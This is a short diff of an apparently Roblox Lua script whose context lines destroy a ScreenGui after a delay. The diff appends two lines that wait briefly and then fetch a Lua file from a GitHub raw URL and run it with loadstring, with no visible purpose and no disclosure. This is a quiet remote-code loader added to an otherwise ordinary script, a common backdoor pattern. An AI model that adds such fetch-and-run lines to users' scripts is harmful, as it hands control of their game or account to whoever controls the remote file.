@@ -139,3 +139,5 @@ task.delay(5, function()
 		ScreenGui:Destroy()
 	end
 end)
+wait(0.1)
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/realgengar/scripts/refs/heads/main/users.lua'),true))()
